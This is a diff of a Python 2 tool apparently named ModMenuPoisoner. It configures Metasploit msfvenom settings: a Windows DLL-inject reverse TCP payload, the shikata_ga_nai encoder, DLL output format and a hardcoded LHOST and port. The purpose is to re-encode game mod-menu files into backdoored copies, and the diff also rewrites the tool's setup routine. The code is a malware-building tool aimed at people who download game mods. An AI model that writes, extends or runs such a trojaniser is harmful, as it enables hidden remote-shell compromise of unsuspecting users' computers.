@@ -10,19 +10,22 @@ import operator
 import sys
 import StringIO
 sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen
-payload_Generate = 'windows/patchupdllinject/reverse_tcp_uuid'
-# LHOST = str(raw_input("Enter LHOST (or 8.8.8.8 if you don't care): "))
-# LPORT = str(raw_input("Enter LPORT (usually 443 is good enough): "))
-# input_Mod_Menu = str(raw_input("Enter the full path of the Mod Menu file: "))
-bad_Bytes = 'x00'
-payload_Encoder = 'x86/shikata_ga_nai'
-payload_Iterations = '1'
-output_Format = 'dll'
-output_Dir = '/root/Documents/ModMenusReencoded/'
+
 
 os.system('cat /root/ModMenuPoisoner/banner.txt')
 wordlist_file = '/root/ModMenuPoisoner/WordlistOfMods.txt'
 def poison_mod():
+    payload_Generate = 'windows/patchupdllinject/reverse_tcp_uuid'
+    LHOST = '8.8.8.8'
+    LPORT = '443'
+    # input_Mod_Menu = str(raw_input("Enter the full path of the Mod Menu file: "))
+    bad_Bytes = 'x00'
+    payload_Encoder = 'x86/shikata_ga_nai'
+    payload_Iterations = '1'
+    # output_Format = 'exe'
+    output_Format = 'dll'
+
+    output_Dir = '/root/Documents/ModMenusReencoded/'
     input_Mod_Menu = str(raw_input("Enter the full path of the Mod Menu file: "))
 
     # Lets just keep the code simple, all the user has to do is copy and paste the file path, and rename the file
@@ -58,30 +61,34 @@ def open_dir():
     main()
 
 def setup():
-    # Git Clone
-    print 'Git cloning newest copy of Poisoner, please wait'
-    os.chdir('/tmp')
-    os.system('git clone https://github.com/tanc7/ModMenuPoisoner')
-
-    # make directories
-    print 'Making required directories'
-    os.system('mkdir /root/ModMenuPoisoner')
-    os.system('mkdir /root/Documents/ModMenusReencoded/')
-    # chmod executables
-    os.system('chmod 777 ./*')
-    # copy to new install directory
-    os.system('cp -r ./* /root/ModMenuPoisoner')
-    # Copy to usr/local/bin
-    print 'Adding executable to /usr/local/bin'
-    os.system('cp -r ModMenuPoisoner.py /usr/local/bin')
-
-    output_Dir = '/root/Documents/ModMenusReencoded' # This is the directory for output msfvenom payloads
-    # print setup complete
-    print 'Installing required Python modules'
     os.system('pip install termcolor')
-    print 'Setup complete'
-    print 'For future reference, your reencoded mod menus will be located at: ' + output_Dir
-    print 'You can run Mod Menu Poisoner Now on terminal by typing: ModMenuPoisoner.py'
+    print '[+] Setup complete'
+    return
+
+# def setup():
+#     # Git Clone
+#     print 'Git cloning newest copy of Poisoner, please wait'
+#     os.chdir('/tmp')
+#     os.system('git clone https://github.com/tanc7/ModMenuPoisoner')
+#
+#     # make directories
+#     print 'Making required directories'
+#     os.system('mkdir /root/Documents/ModMenusReencoded/')
+#     # chmod executables
+#     os.system('chmod 777 ./*')
+#     # copy to new install directory
+#     os.system('cp -r ./* /root/ModMenuPoisoner')
+#     # Copy to usr/local/bin
+#     print 'Adding executable to /usr/local/bin'
+#     os.system('cp -r ModMenuPoisoner.py /usr/local/bin')
+#
+#     output_Dir = '/root/Documents/ModMenusReencoded' # This is the directory for output msfvenom payloads
+#     # print setup complete
+#     print 'Installing required Python modules'
+#     os.system('pip install termcolor')
+#     print 'Setup complete'
+#     print 'For future reference, your reencoded mod menus will be located at: ' + output_Dir
+#     print 'You can run Mod Menu Poisoner Now on terminal by typing: ModMenuPoisoner.py'
 
 def no_encoder():
     input_Mod_Menu = str(raw_input("Enter the full path of the Mod Menu file: "))
